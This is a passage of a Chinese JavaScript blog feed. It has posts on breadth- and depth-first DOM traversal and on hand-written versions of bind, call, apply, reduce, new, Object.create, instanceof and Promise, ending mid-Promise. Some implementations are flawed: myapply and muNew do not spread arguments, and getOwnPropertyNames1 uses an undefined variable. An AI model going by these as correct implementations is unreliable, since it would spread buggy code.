    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;在网上看到了一道关于dom节点遍历的题，自己也有点忘记了，所以决定重新写一个遍历函数，顺便复习一下广度遍历和深度遍历。下面就是两类实现dom节点遍历的方法：<br><a id="more"></a></p>
<h2 id="1-基本DOM结构"><a href="#1-基本DOM结构" class="headerlink" title="1.基本DOM结构"></a>1.基本DOM结构</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>js_question<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-1-1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-1-1-1"</span>&gt;</span></span><br><span class="line">          a</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-1-2"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-1-2-1"</span>&gt;</span>b<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-1-3"</span>&gt;</span>c<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-2"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-2-1"</span>&gt;</span></span><br><span class="line">        d</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-2-2"</span>&gt;</span>e<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-3"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child-3-1"</span>&gt;</span>f<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2-广度优先遍历"><a href="#2-广度优先遍历" class="headerlink" title="2.广度优先遍历"></a>2.广度优先遍历</h2><ul>
<li><p>主要是通过队列来模拟实现的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = <span class="built_in">document</span>.querySelector(<span class="string">'.parent'</span>)</span><br><span class="line"><span class="keyword">let</span> widthTraversal2 = <span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> nodes = []</span><br><span class="line">  <span class="keyword">let</span> stack = []</span><br><span class="line">  <span class="keyword">if</span> (node) &#123;</span><br><span class="line">    stack.push(node)</span><br><span class="line">    <span class="keyword">while</span> (stack.length) &#123;</span><br><span class="line">      <span class="keyword">let</span> item = stack.shift()</span><br><span class="line">      <span class="keyword">let</span> children = item.children</span><br><span class="line">      nodes.push(item)</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; children.length; i++) &#123;</span><br><span class="line">        stack.push(children[i])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nodes</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(widthTraversal2(node))</span><br><span class="line"><span class="comment">// stack数组中的变化  先进先出</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[parent]</span></span><br><span class="line"><span class="comment">[child1, child2, child3]</span></span><br><span class="line"><span class="comment">[child2,child3,child1-1,child1-2,child1-3]</span></span><br><span class="line"><span class="comment">[child3,child1-1,child1-2,child1-3,child2-1]</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>最终结果<br><img src="/images/dom1.png" alt="My Pic"></p>
</li>
</ul>
<h2 id="3-深度优先遍历"><a href="#3-深度优先遍历" class="headerlink" title="3.深度优先遍历"></a>3.深度优先遍历</h2><ul>
<li><p>主要是通过栈来模拟实现</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> node = <span class="built_in">document</span>.querySelector(<span class="string">'.parent'</span>)</span><br><span class="line"><span class="keyword">let</span> deepTraversal1 = <span class="function">(<span class="params">node, nodeList = []</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (node !== <span class="literal">null</span>) &#123;</span><br><span class="line">    nodeList.push(node)</span><br><span class="line">    <span class="keyword">let</span> children = node.children</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; children.length; i++) &#123;</span><br><span class="line">      deepTraversal1(children[i], nodeList)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nodeList</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> deepTraversal2 = <span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> nodes = []</span><br><span class="line">    <span class="keyword">if</span> (node !== <span class="literal">null</span>) &#123;</span><br><span class="line">      nodes.push(node)</span><br><span class="line">      <span class="keyword">let</span> children = node.children</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; children.length; i++) &#123;</span><br><span class="line">        nodes = nodes.concat(deepTraversal2(children[i]))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nodes</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 非递归</span></span><br><span class="line"><span class="keyword">let</span> deepTraversal3 = <span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> stack = []</span><br><span class="line">  <span class="keyword">let</span> nodes = []</span><br><span class="line">  <span class="keyword">if</span> (node) &#123;</span><br><span class="line">    <span class="comment">// 推入当前处理的node</span></span><br><span class="line">    stack.push(node)</span><br><span class="line">    <span class="keyword">while</span> (stack.length) &#123;</span><br><span class="line">      <span class="keyword">let</span> item = stack.pop()</span><br><span class="line">      <span class="keyword">let</span> children = item.children</span><br><span class="line">      nodes.push(item)</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = children.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        stack.push(children[i])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nodes</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(deepTraversal3(node))</span><br><span class="line"><span class="comment">//stack数组中的变化   先进后出</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[parent]</span></span><br><span class="line"><span class="comment">[child3,child2,child1]</span></span><br><span class="line"><span class="comment">[child3,child2,child1-3,child1-2,child1-1]</span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>最终结果<br><img src="/images/dom2.png" alt="My Pic"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS中常用方法的实现</title>
    <url>/2019/11/22/JS%E4%B8%AD%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;对于一些我们在工作中经常使用的方法，我们可能已经对它的用法、参数、返回等非常清楚，甚至了如指掌。但是对于其具体的实现可能就只知道个大概，要自己完全实现还是会有一定的困难，但是这个思考的过程也是我们进步和提升很重要的一步，下面就和大家一起思考着来实现一些常用的方法：<br><a id="more"></a></p>
<h3 id="bind，apply和call"><a href="#bind，apply和call" class="headerlink" title="bind，apply和call"></a>bind，apply和call</h3><blockquote>
<p>这三个函数的作用都是改变this的指向，不同点 call、apply 是直接调用函数，bind 是返回一个新的函数。call 跟 apply 就只有参数上不同。</p>
</blockquote>
<h4 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h4><blockquote>
<p>bind的基本用法就是传递一个作用域及参数 返回一个函数<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.bind(context, args)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>实现<blockquote>
<p>1.首先判断调用者是否为函数<br>2.将传递的数据参数取出来<br>3.创建一个干净的函数，用于保存原函数的原型<br>4.构造绑定的函数 this instanceof nop, 判断是否使用 new 来调用 bound， 如果是 new 来调用的话，this的指向就是其实例，如果不是 new 调用的话，就改变 this 指向到指定的对象<br>5.然后再判断是否为箭头函数，箭头函数没有 prototype，箭头函数this永远指向它所在的作用域</p>
<ol>
<li>最后修改绑定函数的原型指向<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.mybind = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">'function'</span>)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Bind must be called on a function"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">let</span> self = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">let</span> nop = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> self.apply(<span class="keyword">this</span> <span class="keyword">instanceof</span> nop ? <span class="keyword">this</span> : context, args.concat(<span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>)))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.prototype) &#123;</span><br><span class="line">      nop.prototype = <span class="keyword">this</span>.prototype</span><br><span class="line">    &#125;</span><br><span class="line">    result.prototype = <span class="keyword">new</span> nop()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
</li>
</ul>
<h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><blockquote>
<p>call的原理是将函数在给定作用域和给定参数上执行并返回相应的结果<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.call(context,arg1,arg2...)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>*实现</p>
<blockquote>
<ol>
<li>取出数据参数部分</li>
<li>创建一个唯一标识，避免调用函数上存在同名函数导致报错</li>
<li>将调用作用域的标识函数赋值为传入的作用域（未传则默认window）</li>
<li>在传入作用域调用该函数</li>
<li>删除相应的变量并返回结果<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.mycall = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">'function'</span>)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Bind must be called on a function"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">let</span> fn = <span class="built_in">Symbol</span>(<span class="string">'fn'</span>)</span><br><span class="line">    context = context || <span class="built_in">window</span></span><br><span class="line">    context[fn] = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">const</span> result = context[fn](...args)</span><br><span class="line">    <span class="keyword">delete</span> context[fn]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<h4 id="apply"><a href="#apply" class="headerlink" title="apply"></a>apply</h4><blockquote>
<p>和call的实现基本上完全一样就不再赘述了，直接上代码吧</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myapply = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">'function'</span>)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Bind must be called on a function"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> fn = <span class="built_in">Symbol</span>(<span class="string">'fn'</span>)</span><br><span class="line">    context = context || <span class="built_in">window</span></span><br><span class="line">    context[fn] = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">const</span> result = context[fn](<span class="built_in">arguments</span>[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">delete</span> context[fn]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="reduce的实现"><a href="#reduce的实现" class="headerlink" title="reduce的实现"></a>reduce的实现</h3><blockquote>
<p>reduce是数组中的一个累加方法，通过传递一个函数和初始值（可不传），得到一个累加值返回。函数中又包含了4个参数，分别是当前累计值、下一个值、索引、数组<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">array.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">total, currentValue, currentIndex, arr</span>), <span class="title">initialValue</span>)</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>实现<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myreduce = <span class="function"><span class="keyword">function</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">this</span>, len = <span class="keyword">this</span>.length, k = <span class="number">0</span>, status</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="literal">undefined</span>, initvalue = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span> ? <span class="built_in">arguments</span>[<span class="number">1</span>] : <span class="literal">undefined</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> func !== <span class="string">'function'</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(func + <span class="string">' is not a function'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数组为空，并且有初始值，报错</span></span><br><span class="line">    <span class="keyword">if</span> (len === <span class="number">0</span> &amp;&amp; <span class="built_in">arguments</span>.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Reduce of empty array with no initial value'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (initvalue !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      sum = initvalue</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      sum = arr[k]</span><br><span class="line">      k++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(k&lt;len) &#123;</span><br><span class="line">      status = arr.hasOwnProperty(k)</span><br><span class="line">      <span class="keyword">if</span> (status) &#123;</span><br><span class="line">        <span class="keyword">const</span> value = arr[k]</span><br><span class="line">        sum = func.apply(<span class="literal">undefined</span>, [sum, value, k, arr])</span><br><span class="line">      &#125;</span><br><span class="line">      k++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><blockquote>
<p>new之后的操作主要是</p>
<ol>
<li>创建一个新对象</li>
<li>将构造函数的作用域赋给新对象</li>
<li>执行构造函数中的代码，为新对象添加属性</li>
<li>返回新对象</li>
</ol>
</blockquote>
<ul>
<li><p>实现 ES5</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myNew</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 创建一个实例对象</span></span><br><span class="line">  <span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">  <span class="comment">// 取得外部传入的构造器</span></span><br><span class="line">  <span class="keyword">var</span> Constructor = <span class="built_in">Array</span>.prototype.shift.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="comment">// 实现继承，实例可以访问构造器的属性</span></span><br><span class="line">  obj.__proto__ = Constructor.prototype;</span><br><span class="line">  <span class="comment">// 调用构造器，并改变其 this 指向到实例</span></span><br><span class="line">  <span class="keyword">var</span> ret = Constructor.apply(obj, <span class="built_in">arguments</span>);</span><br><span class="line">  <span class="comment">// 如果构造函数返回值是对象则返回这个对象，如果不是对象则返回新的实例对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> ret === <span class="string">'object'</span> &amp;&amp; ret !== <span class="literal">null</span> ? ret : obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>实现ES6</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">muNew</span> (<span class="params">fn,...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> obj = <span class="built_in">Object</span>.create(fn.prototype)</span><br><span class="line">    <span class="keyword">const</span> res = fn.call(obj, args)</span><br><span class="line">    <span class="keyword">return</span> res <span class="keyword">instanceof</span> <span class="built_in">Object</span> ? res : obj</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create"></a>Object.create</h3><blockquote>
<p>Object.create主要是创建一个新对象，使用现有的对象来提供新创建的对象的proto<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.create(proto, [propertiesObject])</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">proto : 必须。表示新建对象的原型对象，即该参数会被赋值到目标对象(即新对象，或说是最后返回的对象)的原型上。该参数可以是null， 对象， 函数的prototype属性 （创建空的对象时需传null , 否则会抛出TypeError异常）。propertiesObject : 可选。 添加到新创建对象的可枚举属性（即其自身的属性，而不是原型链上的枚举属性）对象的属性描述符以及相应的属性名称。这些属性对应Object.defineProperties()的第二个参数。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>实现<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.create1 = <span class="function"><span class="keyword">function</span> (<span class="params">prototype, properties</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> prototype !== <span class="string">"object"</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">TypeError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Func</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    Func.prototype = prototype;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> Func();</span><br><span class="line">    <span class="keyword">if</span> (prototype) &#123; o.constructor = Func; &#125;</span><br><span class="line">    <span class="keyword">if</span> (properties !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (properties !== <span class="built_in">Object</span>(properties)) &#123; <span class="keyword">throw</span> <span class="built_in">TypeError</span>(); &#125;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperties(o, properties);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><blockquote>
<p>主要是测试一个对象在其原型链中是否存在一个构造函数的 prototype 属性<br>和它一样经常使用的typeof 则是来判断数据是什么类型的（返回值主要是<br>“number”、”string”、”boolean”、”object”、”function” 和 “undefined”）</p>
<ul>
<li>实现<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">instance_of</span> (<span class="params">L , R</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> b = R.prototype</span><br><span class="line">  <span class="keyword">let</span> l = L.__proto__</span><br><span class="line">  <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (l === <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (l === b) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    l = l.__proto__</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<h3 id="Array-isArray"><a href="#Array-isArray" class="headerlink" title="Array.isArray"></a>Array.isArray</h3><blockquote>
<p>Array中的一个方法，判断传入值是否为一个数组 实现起来也比较的简单就是一个通用类型的判断</p>
<ul>
<li>实现<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.myisarray = <span class="function"><span class="keyword">function</span> (<span class="params">o</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(o) === <span class="string">'[object Array]'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<h3 id="getOwnPropertyNames"><a href="#getOwnPropertyNames" class="headerlink" title="getOwnPropertyNames"></a>getOwnPropertyNames</h3><blockquote>
<p>Object.getOwnPropertyNames()方法返回一个由指定对象的所有自身属性的属性名（包括不可枚举属性但不包括Symbol值作为名称的属性）组成的数组。<br>和它有类型作用的还有for in（会遍历自身及原型链上的可枚举属性）和Object.keys(对象自身的可枚举属性的key输出)</p>
</blockquote>
<ul>
<li>实现<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames1 = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj !== <span class="built_in">Object</span>(obj)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">'Object.getOwnPropertyNames called on non-object'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> arr= [], p;</span><br><span class="line">  <span class="keyword">for</span> (p <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Object</span>.prototype.hasOwnProperty.call(o, p)) &#123;</span><br><span class="line">      arr.push(p)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h3><blockquote>
<p>Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理且更强大。它最早由社区提出并实现，ES6将其写进了语言标准，统一了用法，并原生提供了Promise对象。</p>
<p>Promise构造函数接受一个函数作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由JavaScript引擎提供，不用自己部署。resolve作用是将Promise对象状态由“未完成”变为“成功”，也就是Pending -&gt; Fulfilled，在异步操作成功时调用，并将异步操作的结果作为参数传递出去；而reject函数则是将Promise对象状态由“未完成”变为“失败”，也就是Pending -&gt; Rejected，在异步操作失败时调用，并将异步操作的结果作为参数传递出去</p>
<p>除此之外，其中还包括了很多的方法如Promise.all、Promise.race、Promise.resolve、Promise.reject等</p>
<p>这个实现起来会比之前的复杂一点，我们可以先列出一些需要实现的点，并且实现使用ts</p>
</blockquote>
<ul>
<li><p>大概构成</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> selfPromise &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">handle: <span class="built_in">Function</span></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>  &#123;</span><br><span class="line">      handle(<span class="keyword">this</span>._resolve, <span class="keyword">this</span>._reject);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">this</span>._reject(err)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> _status: <span class="built_in">string</span> = <span class="string">'pending'</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> _resolve = <span class="function"><span class="params">val</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> _reject = <span class="function"><span class="params">val</span> =&gt;</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  then(onFulfilled?, onRejected?) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> () &#123;&#125;</span><br><span class="line">  <span class="keyword">finally</span>() &#123;&#125;</span><br><span class="line">  <span class="keyword">static</span> resolve () &#123;&#125;</span><br><span class="line">  <span class="keyword">static</span> reject () &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> all () &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> race () &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>具体实现(TS版)</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isFunction = <span class="function"><span class="params">variable</span> =&gt;</span> <span class="keyword">typeof</span> variable === <span class="string">'function'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义Promise的三种状态常量</span></span><br><span class="line"><span class="keyword">const</span> PENDING = <span class="string">'pending'</span>;</span><br><span class="line"><span class="keyword">const</span> FULFILLED = <span class="string">'fulfilled'</span>;</span><br><span class="line"><span class="keyword">const</span> REJECTED = <span class="string">'rejected'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> MyPromise &#123;</span><br><span class="line">  <span class="comment">// 构造函数，new 时触发</span></span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">handle: <span class="built_in">Function</span></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      handle(<span class="keyword">this</span>._resolve, <span class="keyword">this</span>._reject);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">this</span>._reject(err);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 状态 pending fulfilled rejected</span></span><br><span class="line">  <span class="keyword">private</span> _status: <span class="built_in">string</span> = PENDING;</span><br><span class="line">  <span class="comment">// 储存 value，用于 then 返回</span></span><br><span class="line">  <span class="keyword">private</span> _value: <span class="built_in">string</span> | <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span 